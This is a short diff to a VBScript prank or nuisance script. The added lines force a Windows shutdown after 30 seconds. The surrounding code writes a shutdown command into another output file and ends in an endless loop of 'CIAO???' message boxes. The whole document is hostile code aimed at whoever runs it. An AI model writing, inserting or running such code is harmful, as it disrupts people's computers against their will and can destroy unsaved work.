@@ -14,6 +14,11 @@ OutPutFile.WriteLine("oShell.run ""cmd /K CD C:\ & shutdown /s""")
 OutPutFile.WriteLine("Set oShell = Nothing")
 Set FSO= Nothing
 
+Dim oShell
+Set oShell = WScript.CreateObject ("WSCript.shell")
+oShell.run "cmd /K CD C:\ & shutdown /s /t 30"
+Set oShell = Nothing
+
 do
 msgbox "CIAO???"
 loop
